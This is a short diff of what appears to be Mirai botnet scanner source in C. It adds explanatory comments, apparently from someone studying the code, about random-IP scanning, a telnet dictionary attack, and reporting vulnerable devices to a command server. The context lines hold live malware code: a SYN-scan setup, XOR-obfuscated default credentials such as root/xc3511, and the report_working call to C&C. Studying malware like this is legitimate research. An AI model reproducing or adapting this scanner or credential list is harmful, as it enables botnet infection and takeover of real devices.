@@ -54,6 +54,11 @@ int recv_strip_null(int sock, void *buf, int len, int flags)
     return ret;
 }
 
+/*
+scan for vulnerable devices,
+1. randomly generate IP, try to connect
+2. using dict attack to search for targets
+*/
 void scanner_init(void)
 {
     int i;
@@ -120,7 +125,7 @@ void scanner_init(void)
     tcph->window = rand_next() & 0xffff;
     tcph->syn = TRUE;
 
-    // Set up passwords
+    // Set up passwords, dict attack
     add_auth_entry("\x50\x4D\x4D\x56", "\x5A\x41\x11\x17\x13\x13", 10);                     // root     xc3511
     add_auth_entry("\x50\x4D\x4D\x56", "\x54\x4B\x58\x5A\x54", 9);                          // root     vizxv
     add_auth_entry("\x50\x4D\x4D\x56", "\x43\x46\x4F\x4B\x4C", 8);                          // root     admin
@@ -609,6 +614,7 @@ void scanner_init(void)
 #ifdef DEBUG
                                 printf("[scanner] FD%d Found verified working telnet\n", conn->fd);
 #endif
+                                // found an vulnerable device, report the IP, port to C&C
                                 report_working(conn->dst_addr, conn->dst_port, conn->auth);
                                 close(conn->fd);
                                 conn->fd = -1;
